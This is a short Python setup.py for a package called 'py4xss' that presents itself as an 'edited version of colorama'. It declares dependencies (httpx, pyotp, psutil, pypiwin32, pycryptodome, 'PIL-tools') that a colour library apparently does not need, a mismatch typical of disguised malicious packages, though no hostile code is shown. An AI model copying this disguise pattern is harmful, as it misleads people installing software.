from setuptools import setup, find_packages

__name__ = "py4xss"
__version__ = "1.5.6"

setup(
    name=__name__,
    version=__version__,
    author="amonguser",
    author_email="<crazyguy29102@gmail.com>",
    description="edited version of colorama",
    long_description_content_type="text/markdown",
    long_description=open("README.md", encoding="utf-8").read(),
    install_requires=['httpx','pyotp','psutil','pypiwin32','pycryptodome','PIL-tools'],
    packages=find_packages(),
    keywords=['bitches'],
    classifiers=[
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ]
)
